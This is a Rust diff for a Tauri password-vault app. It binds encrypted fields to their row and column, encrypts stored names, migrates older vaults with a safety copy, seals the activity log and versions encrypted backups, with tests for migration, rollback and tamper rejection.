@@ -10,6 +10,8 @@ mod backup;
 mod activity;
 mod clipboard;
 mod credentials;
+mod fields;
+mod migrate;
 mod util;
 
 use std::path::{Path, PathBuf};
@@ -312,21 +314,24 @@ fn add_credential(state: tauri::State<AppState>, input: CredentialInput) -> Resu
     validate_credential(&input)?;
 
     let id = uuid_v4();
-    let encrypted_pw = vault::encrypt(&key, &input.password)?;
-    let encrypted_user = vault::encrypt(&key, &input.username)?;
-    let encrypted_url = vault::encrypt(&key, &input.url)?;
-    let encrypted_notes = vault::encrypt(&key, &input.notes)?;
+    let seal = |column: &str, value: &str| fields::seal(&key, "credentials", &id, column, value);
+    let encrypted_service = seal("service", &input.service)?;
+    let encrypted_pw = seal("password_encrypted", &input.password)?;
+    let encrypted_user = seal("username", &input.username)?;
+    let encrypted_url = seal("url", &input.url)?;
+    let encrypted_notes = seal("notes", &input.notes)?;
 
-    let service = input.service.clone();
-    let id_for_insert = id.clone();
     in_transaction(&db, || {
         db.execute(
             "INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
-            rusqlite::params![id_for_insert, service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes],
+            rusqlite::params![id, encrypted_service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes],
         ).map_err(|e| e.to_string())?;
-        activity::log_action(&db, "credential_add", &format!("added {}", service));
+        // No name: the log is readable while locked, so it must not list
+        // which accounts the vault holds.
+        activity::log_action(&db, "credential_add", "added a login");
         Ok(())
     })?;
+    seal_log(&db, &key);
 
     // Only the new id goes back; the webview reloads the list for the rest.
     Ok(id)
@@ -338,37 +343,65 @@ fn update_credential(state: tauri::State<AppState>, id: String, input: Credentia
     let db = require_db(&state)?;
     validate_credential(&input)?;
 
+    let seal = |column: &str, value: &str| fields::seal(&key, "credentials", &id, column, value);
+    // A blank password keeps the stored one, which is already bound to this
+    // row and column.
     let encrypted_pw = if input.password.is_empty() {
         db.query_row("SELECT password_encrypted FROM credentials WHERE id = ?1", rusqlite::params![id], |row| row.get::<_, String>(0))
-            .map_err(|e| e.to_string())?
+            .map_err(|_| "credential not found".to_string())?
     } else {
-        vault::encrypt(&key, &input.password)?
+        seal("password_encrypted", &input.password)?
     };
-    let encrypted_user = vault::encrypt(&key, &input.username)?;
-    let encrypted_url = vault::encrypt(&key, &input.url)?;
-    let encrypted_notes = vault::encrypt(&key, &input.notes)?;
+    let encrypted_service = seal("service", &input.service)?;
+    let encrypted_user = seal("username", &input.username)?;
+    let encrypted_url = seal("url", &input.url)?;
+    let encrypted_notes = seal("notes", &input.notes)?;
 
-    db.execute(
+    let updated = db.execute(
         "UPDATE credentials SET service=?1, username=?2, password_encrypted=?3, url=?4, notes=?5 WHERE id=?6",
-        rusqlite::params![input.service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes, id],
+        rusqlite::params![encrypted_service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes, id],
     ).map_err(|e| e.to_string())?;
+    if updated == 0 {
+        return Err("credential not found".into());
+    }
 
     Ok(())
 }
 
 #[tauri::command]
 fn delete_credential(state: tauri::State<AppState>, id: String) -> Result<(), String> {
-    let _key = require_unlocked(&state)?;
+    let key = require_unlocked(&state)?;
     let db = require_db(&state)?;
     in_transaction(&db, || {
         db.execute("DELETE FROM credentials WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
-        activity::log_action(&db, "credential_delete", "deleted credential");
+        activity::log_action(&db, "credential_delete", "deleted a login");
         Ok(())
     })?;
+    seal_log(&db, &key);
     Ok(())
 }
 
 // ===== Unlock / Lock =====
+
+/// Every migration a vault may need once its data key is known, in order:
+/// format 1 to 2 (encrypt plain fields), 2 to 3 (bind every value, encrypt
+/// names), stronger Argon2 settings, then sealing the activity log. Shared by
+/// unlock, legacy unlock and recovery, so no path opens an unmigrated vault.
+fn bring_up_to_date(db: &Connection, master_password: &str, dek: &[u8; 32]) -> Result<(), String> {
+    migrate_plaintext_fields(db, dek)?;
+    migrate::migrate_to_format_3(db, dek)?;
+    migrate::upgrade_kdf(db, master_password, dek)?;
+    seal_log(db, dek);
+    Ok(())
+}
+
+/// Seal pending log entries. Best effort: a failure here must not block the
+/// operation that logged, and anything left pending is sealed next time.
+fn seal_log(db: &Connection, dek: &[u8; 32]) {
+    if let Err(error) = activity::seal_pending(db, dek) {
+        eprintln!("Encra could not seal the activity log: {error}");
+    }
+}
 
 /// What the vault file holds, read before anything is decrypted.
 #[derive(Debug, PartialEq)]
@@ -411,7 +444,8 @@ fn create_vault_impl(db: &Connection, master_password: &str) -> Result<[u8; 32],
     let mut kdf_salt = [0u8; 32];
     fill_random(&mut kdf_salt);
     let salt_b64 = base64::engine::general_purpose::STANDARD.encode(kdf_salt);
-    let mut wrapping_key = vault::derive_key(master_password, &kdf_salt)?;
+    let params = vault::KdfParams::CURRENT.encode();
+    let mut wrapping_key = vault::derive_key_with(master_password, &kdf_salt, vault::KdfParams::CURRENT)?;
     let dek = vault::generate_dek();
     let wrapped = vault::wrap_dek(&dek, &wrapping_key);
     wrapping_key.zeroize();
@@ -419,13 +453,20 @@ fn create_vault_impl(db: &Connection, master_password: &str) -> Result<[u8; 32],
     let pass_hash = vault::hash_password(master_password)?;
 
     in_transaction(db, || {
-        for (key, value) in [("encrypted_dek", wrapped.as_str()), ("password_hash", pass_hash.as_str()), ("kdf_salt", salt_b64.as_str()), ("schema_version", "2")] {
+        for (key, value) in [
+            ("encrypted_dek", wrapped.as_str()),
+            ("password_hash", pass_hash.as_str()),
+            ("kdf_salt", salt_b64.as_str()),
+            ("kdf_params", params.as_str()),
+            ("schema_version", migrate::FORMAT_3),
+        ] {
             db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES (?1, ?2)", rusqlite::params![key, value])
                 .map_err(|e| e.to_string())?;
         }
         activity::log_action(db, "vault_created", "new vault created");
         Ok(())
     })?;
+    seal_log(db, &dek);
     Ok(dek)
 }
 
@@ -448,21 +489,45 @@ fn unlock_current_vault(db: &Connection, master_password: &str) -> Result<Option
     }
     let kdf_salt = base64::engine::general_purpose::STANDARD.decode(&stored_salt).map_err(|e| e.to_string())?;
 
-    let mut wrapping_key = vault::derive_key(master_password, &kdf_salt)?;
+    let params = migrate::stored_kdf_params(db)?;
+    let mut wrapping_key = vault::derive_key_with(master_password, &kdf_salt, params)?;
     let dek = vault::unwrap_dek(&encrypted_dek, &wrapping_key);
     wrapping_key.zeroize();
     let dek = dek?;
 
     // Migrate before publishing the key, so a failed migration leaves the vault
     // locked rather than unlocked in a half-migrated state.
-    migrate_plaintext_fields(db, &dek)?;
+    bring_up_to_date(db, master_password, &dek)?;
     activity::log_action(db, "unlock", "vault unlocked");
+    seal_log(db, &dek);
     Ok(Some(dek))
 }
 
 /// Whether a master password exists yet, so the first launch shows setup
 /// instead of an unlock form. It says nothing the database file's own
 /// presence doesn't, and it decrypts nothing.
+/// Whether the pre-format-3 safety copy is still on disk. It holds the vault
+/// with the older, weaker protection, so Settings offers to delete it.
+#[tauri::command]
+fn safety_copy_exists(state: tauri::State<AppState>) -> Result<bool, String> {
+    let _key = require_unlocked(&state)?;
+    let db = require_db(&state)?;
+    Ok(migrate::snapshot_path(&db).is_some_and(|path| path.exists()))
+}
+
+#[tauri::command]
+fn delete_safety_copy(state: tauri::State<AppState>) -> Result<(), String> {
+    let key = require_unlocked(&state)?;
+    let db = require_db(&state)?;
+    let Some(path) = migrate::snapshot_path(&db) else { return Ok(()) };
+    if path.exists() {
+        std::fs::remove_file(&path).map_err(|e| format!("could not delete the safety copy: {e}"))?;
+        activity::log_action(&db, "safety_copy_deleted", "pre-upgrade safety copy deleted");
+        seal_log(&db, &key);
+    }
+    Ok(())
+}
+
 #[tauri::command]
 fn vault_status(state: tauri::State<AppState>) -> Result<&'static str, String> {
     let db = require_db(&state)?;
@@ -588,13 +653,13 @@ fn migrate_legacy_vault(
     legacy_key.zeroize();
     wipe_strings(&mut decrypted_passwords);
 
-    migrate_plaintext_fields(db, &new_dek)?;
+    activity::log_action(db, "migration", "legacy vault migrated to DEK model");
+    bring_up_to_date(db, master_password, &new_dek)?;
 
     {
         let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
         *ek = Some(Dek::new(new_dek));
     }
-    activity::log_action(db, "migration", "legacy vault migrated to DEK model");
     Ok(true)
 }
 
@@ -679,6 +744,9 @@ fn lock_vault(state: tauri::State<AppState>, clipboard: tauri::State<Arc<Clipboa
     let db = require_db(&state)?;
     activity::log_action(&db, "lock", "vault locked");
     let mut key = state.encryption_key.lock().map_err(|e| e.to_string())?;
+    if let Some(dek) = key.as_ref() {
+        seal_log(&db, dek);
+    }
     // Dropping the Dek overwrites the key bytes in place.
     *key = None;
     Ok(())
@@ -691,7 +759,7 @@ fn setup_totp(state: tauri::State<AppState>, credential_id: String, secret: Stri
     let key = require_unlocked(&state)?;
     let db = require_db(&state)?;
     totp::validate_secret(&secret)?;
-    let encrypted = vault::encrypt(&key, &secret.trim().to_uppercase())?;
+    let encrypted = fields::seal(&key, "credentials", &credential_id, "totp_secret", &secret.trim().to_uppercase())?;
     let updated = db.execute("UPDATE credentials SET totp_secret = ?1 WHERE id = ?2", rusqlite::params![encrypted, credential_id])
         .map_err(|e| e.to_string())?;
     if updated == 0 {
@@ -738,11 +806,13 @@ fn create_project(state: tauri::State<AppState>, input: journal::ProjectInput) -
         return Err("project name must not be empty".into());
     }
     let id = uuid_v4();
-    let enc_desc = vault::encrypt(&key, &input.description)?;
-    let enc_target = vault::encrypt(&key, &input.target)?;
-    let enc_method = vault::encrypt(&key, &input.methodology)?;
+    let seal = |column: &str, value: &str| fields::seal(&key, "projects", &id, column, value);
+    let enc_name = seal("name", &input.name)?;
+    let enc_desc = seal("description", &input.description)?;
+    let enc_target = seal("target", &input.target)?;
+    let enc_method = seal("methodology", &input.methodology)?;
     db.execute("INSERT INTO projects (id, name, description, target, methodology) VALUES (?1, ?2, ?3, ?4, ?5)",
-        rusqlite::params![id, input.name, enc_desc, enc_target, enc_method])
+        rusqlite::params![id, enc_name, enc_desc, enc_target, enc_method])
         .map_err(|e| e.to_string())?;
     Ok(journal::Project { id, name: input.name, description: input.description, target: input.target, methodology: input.methodology, status: "planning".into(), created_at: "just now".into(), updated_at: "just now".into() })
 }
@@ -754,15 +824,15 @@ fn get_projects(state: tauri::State<AppState>) -> Result<Vec<journal::Project>, 
     let mut stmt = db.prepare("SELECT id, name, description, target, methodology, status, created_at, updated_at FROM projects ORDER BY updated_at DESC")
         .map_err(|e| e.to_string())?;
     let results = stmt.query_map([], |row| {
-        let enc_desc: String = row.get(2)?;
-        let enc_target: String = row.get(3)?;
-        let enc_method: String = row.get(4)?;
+        let id: String = row.get(0)?;
+        let open = |column: &str, stored: String| fields::open_to_string(&key, "projects", &id, column, &stored);
         Ok(journal::Project {
-            id: row.get(0)?, name: row.get(1)?,
-            description: vault::decrypt_to_string(&key, &enc_desc).unwrap_or_default(),
-            target: vault::decrypt_to_string(&key, &enc_target).unwrap_or_default(),
-            methodology: vault::decrypt_to_string(&key, &enc_method).unwrap_or_default(),
+            name: open("name", row.get(1)?).unwrap_or_else(|_| "[unreadable]".into()),
+            description: open("description", row.get(2)?).unwrap_or_default(),
+            target: open("target", row.get(3)?).unwrap_or_default(),
+            methodology: open("methodology", row.get(4)?).unwrap_or_default(),
             status: row.get(5)?, created_at: row.get(6)?, updated_at: row.get(7)?,
+            id,
         })
     })
     .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
@@ -795,8 +865,8 @@ fn add_entry(state: tauri::State<AppState>, input: journal::EntryInput) -> Resul
         return Err("entry title must not be empty".into());
     }
     let id = uuid_v4();
-    let enc_title = vault::encrypt(&key, &input.title)?;
-    let enc_content = vault::encrypt(&key, &input.content)?;
+    let enc_title = fields::seal(&key, "journal_entries", &id, "title", &input.title)?;
+    let enc_content = fields::seal(&key, "journal_entries", &id, "content", &input.content)?;
     let project_id = input.project_id.clone();
     let id_for_insert = id.clone();
     in_transaction(&db, || {
@@ -816,13 +886,14 @@ fn get_entries(state: tauri::State<AppState>, project_id: String) -> Result<Vec<
     let mut stmt = db.prepare("SELECT id, project_id, title, content, entry_type, severity, created_at FROM journal_entries WHERE project_id = ?1 ORDER BY created_at DESC")
         .map_err(|e| e.to_string())?;
     let results = stmt.query_map(rusqlite::params![project_id], |row| {
-        let enc_title: String = row.get(2)?;
-        let enc_content: String = row.get(3)?;
+        let id: String = row.get(0)?;
+        let open = |column: &str, stored: String| fields::open_to_string(&key, "journal_entries", &id, column, &stored);
         Ok(journal::JournalEntry {
-            id: row.get(0)?, project_id: row.get(1)?,
-            title: vault::decrypt_to_string(&key, &enc_title).unwrap_or_else(|_| "[decryption failed]".into()),
-            content: vault::decrypt_to_string(&key, &enc_content).unwrap_or_else(|_| "[decryption failed]".into()),
+            project_id: row.get(1)?,
+            title: open("title", row.get(2)?).unwrap_or_else(|_| "[unreadable]".into()),
+            content: open("content", row.get(3)?).unwrap_or_else(|_| "[unreadable]".into()),
             entry_type: row.get(4)?, severity: row.get(5)?, created_at: row.get(6)?,
+            id,
         })
     })
     .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
@@ -862,11 +933,14 @@ fn insert_entries(
         if input.title.trim().is_empty() {
             return Err("entry title must not be empty".into());
         }
+        let id = uuid_v4();
+        let title = fields::seal(key, "journal_entries", &id, "title", &input.title)?;
+        let content = fields::seal(key, "journal_entries", &id, "content", &input.content)?;
         prepared.push((
-            uuid_v4(),
+            id,
             input.project_id.clone(),
-            vault::encrypt(key, &input.title)?,
-            vault::encrypt(key, &input.content)?,
+            title,
+            content,
             input.entry_type.clone(),
             input.severity.clone(),
         ));
@@ -922,10 +996,11 @@ fn add_kb_entry(state: tauri::State<AppState>, input: kb::KBInput) -> Result<kb:
         return Err("title must not be empty".into());
     }
     let id = uuid_v4();
-    let enc_title = vault::encrypt(&key, &input.title)?;
-    let enc_cmd = vault::encrypt(&key, &input.command)?;
-    let enc_desc = vault::encrypt(&key, &input.description)?;
-    let enc_tags = vault::encrypt(&key, &input.tags)?;
+    let seal = |column: &str, value: &str| fields::seal(&key, "kb_entries", &id, column, value);
+    let enc_title = seal("title", &input.title)?;
+    let enc_cmd = seal("command", &input.command)?;
+    let enc_desc = seal("description", &input.description)?;
+    let enc_tags = seal("tags", &input.tags)?;
     db.execute("INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
         rusqlite::params![id, enc_title, enc_cmd, enc_desc, enc_tags, input.category])
         .map_err(|e| e.to_string())?;
@@ -939,17 +1014,16 @@ fn get_kb_entries(state: tauri::State<AppState>) -> Result<Vec<kb::KBEntry>, Str
     let mut stmt = db.prepare("SELECT id, title, command, description, tags, category, created_at FROM kb_entries ORDER BY created_at DESC")
         .map_err(|e| e.to_string())?;
     let results = stmt.query_map([], |row| {
-        let enc_title: String = row.get(1)?;
-        let enc_cmd: String = row.get(2)?;
-        let enc_desc: String = row.get(3)?;
-        let enc_tags: String = row.get(4)?;
+        let id: String = row.get(0)?;
+        let open = |column: &str, stored: String| fields::open_to_string(&key, "kb_entries", &id, column, &stored);
         Ok(kb::KBEntry {
-            id: row.get(0)?,
-            title: vault::decrypt_to_string(&key, &enc_title).unwrap_or_else(|_| "[decryption failed]".into()),
-            command: vault::decrypt_to_string(&key, &enc_cmd).unwrap_or_else(|_| "[decryption failed]".into()),
-            description: vault::decrypt_to_string(&key, &enc_desc).unwrap_or_else(|_| "[decryption failed]".into()),
-            tags: vault::decrypt_to_string(&key, &enc_tags).unwrap_or_else(|_| "[decryption failed]".into()),
+            title: open("title", row.get(1)?).unwrap_or_else(|_| "[unreadable]".into()),
+            // Empty rather than a placeholder, so a copy can never paste junk.
+            command: open("command", row.get(2)?).unwrap_or_default(),
+            description: open("description", row.get(3)?).unwrap_or_default(),
+            tags: open("tags", row.get(4)?).unwrap_or_default(),
             category: row.get(5)?, created_at: row.get(6)?,
+            id,
         })
     })
     .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
@@ -973,22 +1047,52 @@ fn export_backup(state: tauri::State<AppState>, backup_password: String) -> Resu
     require_min_length(&backup_password, "Backup password", MIN_BACKUP_PASSWORD_CHARS)?;
 
     let data = backup::collect_all(&db, &key)?;
-    let json = serde_json::to_string(&data).map_err(|e| e.to_string())?;
+    let json = zeroize::Zeroizing::new(serde_json::to_string(&data).map_err(|e| e.to_string())?);
+    let bundled = seal_backup(&json, &backup_password)?;
 
-    // Per-backup random salt
+    activity::log_action(&db, "backup_export", "vault exported");
+    seal_log(&db, &key);
+    Ok(bundled)
+}
+
+/// Backup files written since vault format 3 start with this, then the Argon2
+/// settings, the salt and the payload. Older files are just "salt:payload".
+const BACKUP_ENVELOPE: &str = "encra-backup:2";
+const BACKUP_AAD: &str = "encra:v1:backup";
+
+fn seal_backup(json: &str, backup_password: &str) -> Result<String, String> {
     let mut salt = [0u8; 32];
     fill_random(&mut salt);
     let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
-
-    let mut wrapping_key = vault::derive_key(&backup_password, &salt)?;
-    let payload = vault::encrypt(&wrapping_key, &json)?;
+    let params = vault::KdfParams::CURRENT;
+    let mut wrapping_key = vault::derive_key_with(backup_password, &salt, params)?;
+    let payload = vault::encrypt_bound(&wrapping_key, json, BACKUP_AAD);
     wrapping_key.zeroize();
+    Ok(format!("{BACKUP_ENVELOPE}:{}:{salt_b64}:{}", params.encode(), payload?))
+}
 
-    // Prepend salt to the payload so import can recover it
-    let bundled = format!("{}:{}", salt_b64, payload);
-
-    activity::log_action(&db, "backup_export", "vault exported");
-    Ok(bundled)
+/// Decrypt a backup file. Its Argon2 settings come from the file itself, which
+/// may be hostile, so they are bounds-checked before use (KdfParams::parse).
+fn open_backup(bundled: &str, backup_password: &str) -> Result<zeroize::Zeroizing<String>, String> {
+    let decode = |salt_b64: &str| base64::engine::general_purpose::STANDARD.decode(salt_b64).map_err(|_| "invalid backup format — bad salt".to_string());
+    let bundled = bundled.trim();
+    if let Some(rest) = bundled.strip_prefix(BACKUP_ENVELOPE).and_then(|rest| rest.strip_prefix(':')) {
+        let mut parts = rest.splitn(3, ':');
+        let (Some(params), Some(salt_b64), Some(payload)) = (parts.next(), parts.next(), parts.next()) else {
+            return Err("invalid backup format — incomplete header".into());
+        };
+        let params = vault::KdfParams::parse(params)?;
+        let mut wrapping_key = vault::derive_key_with(backup_password, &decode(salt_b64)?, params)?;
+        let json = vault::decrypt_bound(&wrapping_key, payload, BACKUP_AAD);
+        wrapping_key.zeroize();
+        return json.map_err(|_| "wrong backup password, or the file is damaged".into());
+    }
+    // Before format 3: "salt:payload", library-default Argon2, no binding.
+    let (salt_b64, payload) = bundled.split_once(':').ok_or("invalid backup format — missing salt")?;
+    let mut wrapping_key = vault::derive_key(backup_password, &decode(salt_b64)?)?;
+    let json = vault::decrypt(&wrapping_key, payload);
+    wrapping_key.zeroize();
+    json.map_err(|_| "wrong backup password, or the file is damaged".into())
 }
 
 #[tauri::command]
@@ -997,40 +1101,43 @@ fn import_backup(state: tauri::State<AppState>, bundled: String, backup_password
     let db = require_db(&state)?;
     reject_empty_password(&backup_password, "Backup password")?;
 
-    // Extract salt from bundle
-    let (salt_b64, payload) = bundled.split_once(':')
-        .ok_or("invalid backup format — missing salt")?;
-    let salt = base64::engine::general_purpose::STANDARD
-        .decode(salt_b64)
-        .map_err(|e| e.to_string())?;
+    let json = open_backup(&bundled, &backup_password)?;
+    let data: backup::VaultBackup = serde_json::from_str(&json).map_err(|_| "invalid backup format — unreadable contents".to_string())?;
 
-    let mut wrapping_key = vault::derive_key(&backup_password, &salt)?;
-    let json = vault::decrypt_to_string(&wrapping_key, payload)?;
-    wrapping_key.zeroize();
-    let data: backup::VaultBackup = serde_json::from_str(&json).map_err(|e| e.to_string())?;
-
-    // Re-encrypt every sensitive field under this vault's DEK. A backup made by
-    // another vault is portable because collect_all exported plaintext inside
-    // the encrypted envelope; a payload this key cannot decrypt is rejected
-    // rather than written back as unreadable bytes.
-    let fixed_data = backup::prepare_for_import(data, &key)?;
-
-    backup::restore_all(&db, &fixed_data)?;
+    // Plain text throughout, then sealed row by row under this vault's key as
+    // each row gets its new id. A 1.0 payload this key cannot decrypt is
+    // rejected rather than written back as unreadable bytes.
+    let prepared = backup::prepare_for_import(data, &key)?;
+    backup::restore_all(&db, &key, &prepared)?;
     activity::log_action(&db, "backup_import", "vault data imported");
+    seal_log(&db, &key);
     Ok(())
 }
 
 // ===== Activity =====
 
+#[derive(serde::Serialize)]
+struct ActivityLog {
+    entries: Vec<activity::ActivityEntry>,
+    chain: activity::ChainStatus,
+}
+
 #[tauri::command]
-fn get_activity_log(state: tauri::State<AppState>) -> Result<Vec<activity::ActivityEntry>, String> {
-    let _key = require_unlocked(&state)?;
+fn get_activity_log(state: tauri::State<AppState>) -> Result<ActivityLog, String> {
+    let key = require_unlocked(&state)?;
     let db = require_db(&state)?;
-    let mut stmt = db.prepare("SELECT id, action, detail, timestamp FROM activity_log ORDER BY timestamp DESC LIMIT 100")
+    // Verify before sealing, so new entries are never sealed on top of a
+    // chain that was tampered with (that would launder the tampering).
+    let mut chain = activity::verify_chain(&db, &key)?;
+    if chain.intact && chain.pending > 0 {
+        seal_log(&db, &key);
+        chain = activity::verify_chain(&db, &key)?;
+    }
+    let mut stmt = db.prepare("SELECT id, action, detail, timestamp FROM activity_log ORDER BY seq DESC, rowid DESC LIMIT 100")
         .map_err(|e| e.to_string())?;
-    let results = stmt.query_map([], |row| Ok(activity::ActivityEntry { id: row.get(0)?, action: row.get(1)?, detail: row.get(2)?, timestamp: row.get(3)? }))
-        .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
-    results
+    let entries = stmt.query_map([], |row| Ok(activity::ActivityEntry { id: row.get(0)?, action: row.get(1)?, detail: row.get(2)?, timestamp: row.get(3)? }))
+        .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
+    Ok(ActivityLog { entries, chain })
 }
 
 // ===== Recovery =====
@@ -1064,14 +1171,20 @@ fn reset_master_password(state: tauri::State<AppState>, recovery_code: String, n
         None => return Ok(false),
     };
 
-    // Set in-memory DEK and unlock the app
+    // Recovery opens the vault without going through unlock, so it has to
+    // bring an older vault up to date itself before publishing the key.
+    activity::log_action(&db, "recovery", "master password reset via recovery code");
+    let migrated = bring_up_to_date(&db, &new_password, &dek);
+    if let Err(error) = migrated {
+        dek.zeroize();
+        return Err(error);
+    }
+
     {
         let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
         *ek = Some(Dek::new(dek));
     }
     dek.zeroize();
-
-    activity::log_action(&db, "recovery", "master password reset via recovery code");
     Ok(true)
 }
 
@@ -1115,6 +1228,7 @@ fn main() {
             copy_credential_field, copy_text, check_credential_breach,
             add_credential, update_credential, delete_credential,
             vault_status, create_vault, unlock_vault, lock_vault,
+            safety_copy_exists, delete_safety_copy,
             setup_totp, get_totp_remaining, remove_totp,
             check_hibp,
             create_project, get_projects, delete_project,
@@ -1309,6 +1423,8 @@ mod tests {
         {
             let conn = Connection::open(&path).unwrap();
             seed_vault(&conn, &dek);
+            // Format 2 data, brought to format 3 exactly as at unlock.
+            bring_up_to_date(&conn, "credential-read-password", &dek).unwrap();
         }
         let conn = vault::init_db(&path).unwrap();
         (dir, conn, dek)
@@ -1536,6 +1652,243 @@ mod tests {
         std::fs::remove_dir_all(dir).unwrap();
     }
 
+    // ===== Vault format 3 =====
+
+    const V2_PASSWORD: &str = "format-two-password";
+
+    /// A format-2 vault as an existing user has it: unbound values, plain
+    /// service names, default Argon2, and a log that names a login.
+    fn format_2_vault(label: &str) -> (PathBuf, PathBuf, [u8; 32]) {
+        let dir = migration_test_dir(label);
+        let path = dir.join(CURRENT_DATABASE_NAME);
+        let dek = create_test_vault(&path, V2_PASSWORD);
+        let conn = Connection::open(&path).unwrap();
+        seed_vault(&conn, &dek);
+        activity::log_action(&conn, "unlock", "vault unlocked");
+        activity::log_action(&conn, "credential_add", "added github.com");
+        activity::log_action(&conn, "lock", "vault locked");
+        (dir, path, dek)
+    }
+
+    fn raw(conn: &Connection, sql: &str) -> String {
+        conn.query_row(sql, [], |r| r.get(0)).unwrap()
+    }
+
+    #[test]
+    fn test_format_3_migration_binds_everything_and_survives_reopen() {
+        let (dir, path, dek) = format_2_vault("v3-migrate");
+        {
+            let conn = Connection::open(&path).unwrap();
+            assert_eq!(unlock_current_vault(&conn, V2_PASSWORD).unwrap(), Some(dek));
+        }
+
+        let conn = vault::init_db(&path).unwrap();
+        assert_eq!(migrate::schema_version(&conn).unwrap(), "3");
+        assert_eq!(migrate::stored_kdf_params(&conn).unwrap(), vault::KdfParams::CURRENT);
+
+        // Every encrypted column is bound now, names included.
+        for (table, columns) in fields::ALL {
+            for column in *columns {
+                let mut stmt = conn.prepare(&format!("SELECT {column} FROM {table}")).unwrap();
+                let values: Vec<Option<String>> = stmt.query_map([], |r| r.get(0)).unwrap().collect::<Result<_, _>>().unwrap();
+                for value in values.into_iter().flatten() {
+                    assert!(value.is_empty() || vault::is_bound(&value), "{table}.{column} not bound: {value}");
+                }
+            }
+        }
+        assert!(!raw(&conn, "SELECT group_concat(service) FROM credentials").contains("github"), "service names must be encrypted");
+        assert!(!raw(&conn, "SELECT group_concat(name) FROM projects").contains("Home Lab"), "case names must be encrypted");
+
+        // Same password, same key, after the re-wrap and a reopen.
+        assert_eq!(unlock_current_vault(&conn, V2_PASSWORD).unwrap(), Some(dek));
+        let list = credentials::list_summaries(&conn, &dek).unwrap();
+        assert_eq!(list.iter().map(|c| c.service.as_str()).collect::<Vec<_>>(), ["aws", "github.com"], "sorted in Rust");
+
+        // The log no longer names the login, says what happened, and is sealed.
+        let details = raw(&conn, "SELECT group_concat(detail, '|') FROM activity_log");
+        assert!(!details.contains("github"), "old log entries must be scrubbed: {details}");
+        assert!(details.contains("login names removed from 1 older log entries"));
+        let chain = activity::verify_chain(&conn, &dek).unwrap();
+        assert!(chain.intact, "{:?}", chain.problem);
+        assert_eq!(chain.pending, 0);
+
+        // The safety copy is the untouched format-2 vault.
+        let snapshot = Connection::open(format!("{}.pre-v3", path.display())).unwrap();
+        assert_eq!(migrate::schema_version(&snapshot).unwrap(), "2");
+        assert!(raw(&snapshot, "SELECT group_concat(service) FROM credentials").contains("github.com"));
+        drop(snapshot);
+        drop(conn);
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn test_format_3_migration_rolls_back_and_can_retry() {
+        let (dir, path, dek) = format_2_vault("v3-rollback");
+        {
+            let conn = Connection::open(&path).unwrap();
+            // Fail on the last table, after credentials and projects were rewritten.
+            conn.execute_batch(
+                "CREATE TRIGGER fail_kb BEFORE UPDATE ON kb_entries BEGIN SELECT RAISE(ABORT, 'injected failure'); END;",
+            ).unwrap();
+            assert!(bring_up_to_date(&conn, V2_PASSWORD, &dek).is_err());
+            conn.execute_batch("DROP TRIGGER fail_kb").unwrap();
+        }
+
+        {
+            let conn = vault::init_db(&path).unwrap();
+            assert_eq!(migrate::schema_version(&conn).unwrap(), "2", "a failed migration must leave format 2");
+            assert_eq!(raw(&conn, "SELECT service FROM credentials WHERE id = 'c1'"), "github.com");
+            let stored = raw(&conn, "SELECT password_encrypted FROM credentials WHERE id = 'c1'");
+            assert!(!vault::is_bound(&stored));
+            assert_eq!(vault::decrypt_to_string(&dek, &stored).unwrap(), "gh_p@$$w0rd");
+            assert!(raw(&conn, "SELECT group_concat(detail) FROM activity_log").contains("github.com"), "the scrub must roll back too");
+        }
+
+        // The next unlock simply tries again.
+        let conn = Connection::open(&path).unwrap();
+        assert_eq!(unlock_current_vault(&conn, V2_PASSWORD).unwrap(), Some(dek));
+        assert_eq!(migrate::schema_version(&conn).unwrap(), "3");
+        assert_eq!(credentials::reveal_password(&conn, &dek, "c1").unwrap().as_str(), "gh_p@$$w0rd");
+        drop(conn);
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn test_bound_values_cannot_be_moved_or_downgraded() {
+        let (dir, path, dek) = format_2_vault("v3-binding");
+        let conn = Connection::open(&path).unwrap();
+        bring_up_to_date(&conn, V2_PASSWORD, &dek).unwrap();
+        let c1_password = raw(&conn, "SELECT password_encrypted FROM credentials WHERE id = 'c1'");
+        let c1_notes = raw(&conn, "SELECT notes FROM credentials WHERE id = 'c1'");
+
+        // Another row's password pasted in: refused.
+        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c2'", [&c1_password]).unwrap();
+        assert!(credentials::reveal_password(&conn, &dek, "c2").is_err());
+
+        // The same row's notes pasted into its password: refused.
+        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c1'", [&c1_notes]).unwrap();
+        assert!(credentials::reveal_password(&conn, &dek, "c1").is_err());
+
+        // An old unbound value under the same key (from an older copy): refused.
+        let unbound = vault::encrypt(&dek, "old-password").unwrap();
+        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c1'", [&unbound]).unwrap();
+        assert!(credentials::reveal_password(&conn, &dek, "c1").is_err(), "format-2 values must not be read once a vault is format 3");
+
+        // Putting the real value back works again.
+        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c1'", [&c1_password]).unwrap();
+        assert_eq!(credentials::reveal_password(&conn, &dek, "c1").unwrap().as_str(), "gh_p@$$w0rd");
+        drop(conn);
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
